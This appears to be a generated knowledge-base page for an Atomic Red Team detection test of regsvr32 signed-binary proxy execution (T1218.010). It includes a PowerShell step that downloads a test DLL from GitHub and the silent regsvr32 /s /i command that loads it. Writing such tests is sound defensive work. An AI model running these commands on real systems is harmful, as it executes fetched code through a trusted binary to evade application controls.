---
atomic_guid: "9d71c492-ea2e-4c08-af16-c6994cdf029f"
title: "Regsvr32 Silent DLL Install Call DllRegisterServer"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.010"
attack_technique_name: "Signed Binary Proxy Execution: Regsvr32"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "9d71c492-ea2e-4c08-af16-c6994cdf029f"
  - "Regsvr32 Silent DLL Install Call DllRegisterServer"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Regsvr32 Silent DLL Install Call DllRegisterServer

Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.

## Metadata

- Atomic GUID: 9d71c492-ea2e-4c08-af16-c6994cdf029f
- Technique: T1218.010: Signed Binary Proxy Execution: Regsvr32
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218.010/T1218.010.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]

## Input Arguments

### dll_name

- description: Name of DLL to Install
- type: string
- default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll

### regsvr32name

- description: Default name of Regsvr32.exe
- type: string
- default: regsvr32.exe

### regsvr32path

- description: Default location of Regsvr32.exe
- type: string
- default: C:\Windows\system32

## Dependencies

AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})

### Prerequisite Check

```text
if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
```

## Executor

- name: command_prompt

### Command

```commandprompt
#{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.yaml)
